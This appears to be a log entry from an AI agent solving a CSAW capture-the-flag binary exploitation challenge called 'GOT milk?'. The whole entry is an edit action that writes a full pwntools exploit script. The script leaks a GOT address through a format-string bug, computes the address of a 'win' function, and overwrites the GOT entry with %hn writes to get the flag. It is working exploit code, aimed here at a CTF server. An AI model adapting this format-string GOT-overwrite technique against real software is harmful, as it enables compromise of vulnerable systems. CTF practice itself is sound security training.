2026-10-10 16:03:18,599 INFO 🎬 ACTION (primary)
edit 1:30
from pwn import *

# Addresses
got_lose = 0x0804a010
win_offset = 0x1189
lose_offset = 0x11f8

# Connect and leak lose address
p = remote("pwn.chal.csaw.io", 8000)
p.recvuntil(b"GOT milk? ")

# Leak lose address
payload = p32(got_lose) + b"%7$s"
p.sendline(payload)
response = p.recvall(timeout=2)

# Extract leaked lose address
start_idx = response.find(p32(got_lose))
if start_idx == -1:
    print("Failed to leak address")
    exit(1)
leaked_lose = u32(response[start_idx + 4:start_idx + 8])
print(f"Leaked lose address: {hex(leaked_lose)}")

# Calculate win address
libmylib_base = leaked_lose - lose_offset
win_addr = libmylib_base + win_offset
print(f"Win address: {hex(win_addr)}")

# Now overwrite got_lose with win_addr
p = remote("pwn.chal.csaw.io", 8000)
p.recvuntil(b"GOT milk? ")

# Split win_addr into two 16-bit parts
lower = win_addr & 0xffff
upper = (win_addr >> 16) & 0xffff

# Payload to overwrite GOT
# We'll write lower to got_lose, upper to got_lose+2
# Since lower < upper, write lower first
payload = p32(got_lose) + p32(got_lose + 2)
payload += b"%" + str(lower - 8).encode() + b"x"
payload += b"%7$hn"
payload += b"%" + str(upper - lower).encode() + b"x"
payload += b"%8$hn"

p.sendline(payload)
flag = p.recvall(timeout=2).decode(errors='ignore')
print(flag)

p.close()
end_of_edit

